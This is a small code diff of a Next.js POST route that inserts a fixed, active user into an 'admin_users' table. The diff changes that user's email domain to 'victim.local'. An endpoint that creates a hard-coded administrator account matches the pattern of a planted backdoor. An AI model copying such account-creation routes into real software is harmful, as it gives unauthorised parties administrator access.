@@ -17,7 +17,7 @@ export async function POST(request: NextRequest) {
       .from("admin_users")
       .insert({
         username: "johanimufambi",
-        email: "johanimufambi@hicc.local",
+        email: "johanimufambi@victim.local",
         is_active: true,
       })
       .select()
@@ -32,7 +32,7 @@ export async function POST(request: NextRequest) {
       enabled: true,
       details: {
         username: "johanimufambi",
-        email: "johanimufambi@hicc.local",
+        email: "johanimufambi@victim.local",
         timestamp: new Date().toISOString(),
       },
     })
